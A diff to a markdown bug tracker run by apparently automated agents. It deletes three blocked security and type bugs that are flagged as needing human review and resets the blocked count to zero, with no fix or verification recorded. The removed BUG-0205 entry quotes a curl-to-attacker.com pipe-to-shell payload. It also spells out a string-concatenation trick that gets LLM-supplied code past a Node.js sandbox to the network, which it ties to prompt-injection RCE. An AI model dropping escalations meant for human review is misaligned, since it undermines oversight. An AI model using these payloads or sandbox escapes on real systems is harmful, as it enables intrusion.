@@ -9,7 +9,7 @@
 
 | Key | Value |
 |---|---|
-| **Last CI Sentinel Pass** | `2026-03-21T12:31:27Z` (Cycle 77 — BUILD GREEN. Tests: 6 failed / 1437 passed / 2 skipped across 3 failed suites. Known failures: BUG-0312 (2), BUG-0363 (3), BUG-0456 (1). 264 test files ran. 10 untracked TestGen files all passed. 0 new regressions. 0 new bugs filed. 0 escalations filed.) |
+| **Last CI Sentinel Pass** | `2026-03-21T12:46:00Z` (Cycle 78 — BUILD GREEN. Tests: 6 failed / 1437 passed / 2 skipped across 3 failed suites. Known failures: BUG-0312 (2), BUG-0363 (3), BUG-0456 (1). 264 test files ran. 10 untracked TestGen files all passed (43 tests). 0 new regressions. 0 new bugs filed. 0 escalations filed.) |
 | **Last Hunter Scan** | `2026-03-22T00:10:00Z` |
 | **Last Fixer Pass** | `2026-03-21T21:42:00Z` (idle — 0 pending, 0 reopened, 0 in-progress) |
 | **Last Validator Pass** | `2026-03-21T19:52:00Z` (no fixed/in-validation bugs — 23 blocked) |
@@ -19,7 +19,7 @@
 | **Fixer Loop Interval** | `2min` |
 | **Validator Loop Interval** | `5min` |
 | **Last TestGen Run** | `2026-03-22T02:00:00Z` |
-| **Last Git Manager Pass** | `2026-03-22T21:10:00Z` (Cycle 336 — 0 deletions, 0 rebases; 0 bugfix branches — repo quiescent, 3 bugs blocked, gc --auto executed 336%6=0) |
+| **Last Git Manager Pass** | `2026-03-22T21:30:00Z` (Cycle 338 — 0 deletions, 0 rebases; 0 bugfix branches — repo quiescent, gc skipped 338%6=2) |
 | **Last Supervisor Pass** | `2026-03-21T10:45:28Z` |
 | **Total Found** | `436` |
 | **Total Pending** | `0` |
@@ -27,7 +27,7 @@
 | **Total Fixed** | `0` |
 | **Total In Validation** | `0` |
 | **Total Verified** | `0` |
-| **Total Blocked** | `3` |
+| **Total Blocked** | `0` |
 | **Total Reopened** | `0` |
 
 ---
@@ -167,69 +167,4 @@ pending → in-progress → fixed → in-validation → verified → archived to
 ---
 
 ## Bugs
-
-
-### BUG-0205
-- **status:** `blocked`
-- **severity:** `critical`
-- **file:** `packages/tools/src/code-execution/node-eval.ts`
-- **line:** `57`
-- **category:** `security-injection`
-- **description:** The `node_eval` tool executes LLM-supplied code via `new Function(_input)` in an unrestricted Node.js child process with no capability sandbox, giving arbitrary code full access to the filesystem, network, and ability to spawn subprocesses.
-- **context:** Although the code runs in a child process, the child script applies no restrictions to what Node.js builtins the executed code can call. An LLM-generated payload such as `require('child_process').execSync('curl http://attacker.com | sh')` or `require('fs').readFileSync('/etc/passwd')` would succeed. `safeEnv()` only strips inherited environment variables — it does not prevent filesystem access or network calls. Any prompt-injection attack that tricks the LLM into calling `node_eval` with malicious code achieves full host RCE. The fix requires passing Node.js `--experimental-permission` flags (`--allow-fs-read`, `--allow-net` with explicit allowlists and `--deny-all` default) or migrating to a proper sandbox. OWASP A03:2021 - Injection.
-- **reopen_count:** `3`
-- **branch:** ``
-- **hunter_found:** `2026-03-17T03:05:00Z`
-- **fixer_started:** ``
-- **fixer_completed:** ``
-- **fix_summary:** `Auto-blocked after 3 failed fix attempts. Requires human review. Network gap: ESM import() of builtins bypasses CJS-level patches; --experimental-permission has no network permission. Needs isolated-vm or container-level sandboxing.`
-- **validator_started:** `2026-03-18T01:20:50Z`
-- **validator_completed:** `2026-03-18T01:30:00Z`
-- **validator_notes:** `REOPENED (3rd): [What] Network access still exploitable. [Why] GOOD: --experimental-permission blocks fs-write, child_process, worker_threads. IIFE scope isolation hides security vars. CJS require() blocked. BAD: eval("imp"+"ort('net')") bypasses import() regex via string concatenation, and ESM import() does not go through Module._resolveFilename (CJS-only hook). --experimental-permission has no network permission concept. [Fix approach] Close the network gap: (1) Override globalThis.eval = () => throw, blocking the concatenation trick. (2) Or use --import ESM loader hooks to intercept ESM resolution of network builtins. (3) Or accept the network gap is architectural and block this bug for human decision on whether to adopt isolated-vm or container-level sandboxing.`
-- **test_generated:** `true`
-- **test_file:** `packages/tools/src/__tests__/node-eval-esm-bypass.test.ts`
-
----
-
-### BUG-0256
-- **status:** `blocked`
-- **severity:** `medium`
-- **file:** `packages/a2a/src/server/index.ts`
-- **line:** `11`
-- **category:** `security-auth`
-- **description:** `A2AServer` authentication is opt-in via an optional `apiKey` field — when omitted (the default), all RPC methods including `tasks/send` are publicly accessible with no authentication, rate limiting, or compensating control.
-- **context:** The `apiKey` option defaults to `undefined`, making unauthenticated deployment the path of least resistance. An unauthenticated server accepts `tasks/send` which executes the registered `TaskHandler` — potentially invoking LLM calls, tool execution, and database writes. No warning is logged when auth is disabled. A single shared API key also means no per-method authorization (read vs write). OWASP A07:2021 - Identification and Authentication Failures.
-- **reopen_count:** `4`
-- **branch:** `bugfix/BUG-0256`
-- **hunter_found:** `2026-03-19T19:55:00Z`
-- **fixer_started:** `2026-03-21T04:42:00Z`
-- **fixer_completed:** ``
-- **fix_summary:** `Auto-blocked after 4 failed fix attempts. Requires human review.`
-- **validator_started:** `2026-03-21T04:21:49Z`
-- **validator_completed:** `2026-03-21T04:24:00Z`
-- **validator_notes:** `REOPENED: Fix summary says "Added export type { A2AServerOptions } from ./server/index.js to barrel" — this is a type re-export and has zero relation to the security-auth vulnerability (unauthenticated RPC access). The server still accepts all requests without auth when apiKey is omitted. No authentication logic was added. reopen_count now 4 — Fixer should auto-block per guardrail.`
-
----
-
-### BUG-0264
-- **status:** `blocked`
-- **severity:** `medium`
-- **file:** `src/lsp/client.ts`
-- **line:** `526`
-- **category:** `type-error`
-- **reopen_count:** `3`
-- **branch:** `bugfix/BUG-0264`
-- **description:** Incoming JSON-RPC messages from the LSP server are cast directly to `JsonRpcResponse` (line 526) and `JsonRpcNotification` (line 533) via `as unknown as` without any structural validation.
-- **context:** Messages arrive from JSON parsing as `Record<string, unknown>`. If the LSP server sends a malformed message (missing `id`, wrong `method` shape, or extra fields), the cast silently succeeds and the typed handlers operate on structurally incorrect objects. A missing `id` field on a response would cause the pending request lookup to fail silently, leaving the Promise unresolved indefinitely.
-- **hunter_found:** `2026-03-19T15:11:42Z`
-- **fixer_started:** ``
-- **fixer_completed:** ``
-- **fix_summary:** ``
-- **validator_started:** `2026-03-20T22:25:00Z`
-- **validator_completed:** `2026-03-20T22:25:00Z`
-- **validator_notes:** `Auto-blocked after 3 failed fix attempts. All 3 original failures persist unchanged across 3 fix/validate cycles: (1) no jsonrpc === "2.0" gate, (2) dead typeof id === "undefined" check (never true inside "id" in message guard), (3) no result/error presence validation. Requires human review.`
-- **test_generated:** `true`
-- **test_file:** `src/__tests__/lsp-client-message-validation.test.ts`
-
----
 <!-- HUNTER: Append new bugs above this line -->
